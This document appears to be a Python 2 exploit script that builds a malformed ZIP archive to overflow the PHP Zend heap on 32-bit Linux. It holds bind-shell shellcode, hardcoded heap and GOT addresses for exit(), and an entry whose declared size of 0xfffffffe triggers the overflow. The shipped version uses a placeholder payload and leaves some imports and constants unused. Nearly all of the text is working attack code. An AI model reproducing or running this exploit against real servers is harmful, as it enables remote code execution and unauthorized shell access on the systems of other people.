import os
import sys
import argparse
import socket
import urlparse
import collections
from struct import pack
from binascii import crc32

import requests

# bindshell from PEDA
shellcode = [
    "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
    "\x43\x52\x66\x68%(port)s\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
    "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
    "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
    "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    "\x89\xe1\xcd\x80"
]

# 100k runs had the zend_mm_heap mapped at 0xb6a00040 ~53.333% and at
# 0xb6c00040 ~46.667% of the time.
zend_mm_heap = [0xb6a00040, 0xb6c00040]

# offset to the payload from the zend heap
zend_mm_heap_offset = "0x%xfd0"

# Zend/zend_alloc_sizes.h
zend_mm_max_small_size = 3072

# exit()
R_386_JUMP_SLOT = 0x08960a48

ZipEntry = collections.namedtuple("ZipEntry", "name, data, size")


def zip_file_header(fname, data, size):
    return "".join([
        pack("<I", 0x04034b50),               # signature
        pack("<H", 0x0),                      # minimum version
        pack("<H", 0x0),                      # general purpose bit flag
        pack("<H", 0x0),                      # compression method
        pack("<H", 0),                        # last modification time
        pack("<H", 0),                        # last modification date
        pack("<I", crc32(data) & 0xffffffff), # crc-32
        pack("<I", len(data)),                # compressed size
        pack("<I", size),                     # uncompressed size
        pack("<H", len(fname)),               # filename length
        pack("<H", 0x0),                      # extra field length
        fname,                                # filename
        "",                                   # extra
        data                                  # compressed data
    ])


def zip_central_dir(offset, fname, data, size):
    return "".join([
        pack("<I", 0x02014b50),               # signature
        pack("<H", 0x0),                      # archive created with version
        pack("<H", 0x0),                      # archive requires version
        pack("<H", 0x0),                      # general purpose bit flag
        pack("<H", 0x0),                      # compression method
        pack("<H", 0),                        # last modification time
        pack("<H", 0),                        # last modification date
        pack("<I", crc32(data) & 0xffffffff), # crc-32
        pack("<I", len(data)),                # compressed size
        pack("<I", size),                     # uncompressed size
        pack("<H", len(fname)),               # filename length
        pack("<H", 0x0),                      # extra field length
        pack("<H", 0x0),                      # comment length
        pack("<H", 0x0),                      # disk number
        pack("<H", 0x0),                      # internal file attributes
        pack("<I", 0x0),                      # external file attributes
        pack("<I", offset),                   # offset of file header
        fname,                                # filename
        "",                                   # extra
        "",                                   # comment
    ])


def zip_central_dir_end(num, size, offset):
    return "".join([
        pack("<I", 0x06054b50), # signature
        pack("<H", 0x0),        # disk number
        pack("<H", 0x0),        # disk where central directory starts
        pack("<H", num),        # number of central directories on this disk
        pack("<H", num),        # total number of central directory records
        pack("<I", size),       # size of central directory
        pack("<I", offset),     # offset of central directory
        pack("<H", 0x0),        # comment length
        ""                      # comment
    ])


def zip_entries(addr, shellcode):
    if len(shellcode) > zend_mm_max_small_size:
        sys.exit("[-] shellcode is too big")

    size = 0xfffffffe
    length = 256
    entries = [ZipEntry("shellcode", shellcode, zend_mm_max_small_size)]
    for i in range(1):
        data = chr(0x41 + i) * length
        entries.append(ZipEntry("overflow", data, size))
    return entries


def zip_create(entries):
    archive = []
    directories = []
    offset = 0
    for e in entries:
        file_header = zip_file_header(e.name, e.data, e.size)
        directories.append((e, offset))
        offset += len(file_header)
        archive.append(file_header)

    directories_length = 0
    for e, dir_offset in directories:
        central_dir = zip_central_dir(dir_offset, e.name, e.data, e.size)
        directories_length += len(central_dir)
        archive.append(central_dir)

    end = zip_central_dir_end(len(entries), directories_length, offset)
    archive.append(end)
    return "".join(archive)


def get_shellcode():
    return "B"*128


def main():
    archive = zip_create(zip_entries(0x42424242, get_shellcode()))
    with open(sys.argv[1], 'w') as fd:
        fd.write(archive)


if __name__ == "__main__":
    main()
